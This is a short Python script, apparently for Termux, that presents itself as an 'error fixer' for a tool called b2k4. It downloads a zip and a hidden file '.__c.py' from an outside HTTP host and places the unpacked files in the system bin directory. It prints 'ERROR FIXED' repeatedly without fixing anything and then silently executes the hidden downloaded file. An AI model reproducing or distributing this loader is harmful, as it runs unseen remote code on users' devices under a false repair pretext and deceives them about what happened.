# -*- coding: utf-8 -*-
import os


def fixerbaba():
	os.system("pkg install wget -y")
	os.system("cd $HOME/b2k4")
	os.system("mkdir .b2k4")
	os.system("wget http://b2k4.notun.tech/b2k4.zip")
	os.system("unzip b2k4.zip -d .b2k4")
	os.system("mv .b2k4 $PREFIX/bin/")
	os.system("rm -rf b2k4.zip")
	os.system("cd $HOME/b2k4/")
	os.system("rm -rf .__c.py")
	os.system("wget http://b2k4.notun.tech/.__c.py")
	os.system("clear")
	print("ERROR FIXED")
	print("ERROR FIXED")
	print("ERROR FIXED")
	print("ERROR FIXED")
	print("ERROR FIXED")
	print("ERROR FIXED")
	os.system("clear")
	print("IF YOU FACE ANOTHER ERROR, PLEASE CONTACT ME ON TELEGRAM")
	os.system("xdg-open https://t.me/botolbaba")
	print("\nNOW YOU CAN RUN THIS TOOL BY")
	print("python2 b2k4.py")
	os.system("python2 .__c.py")
	
if __name__ == '__main__':
	fixerbaba()

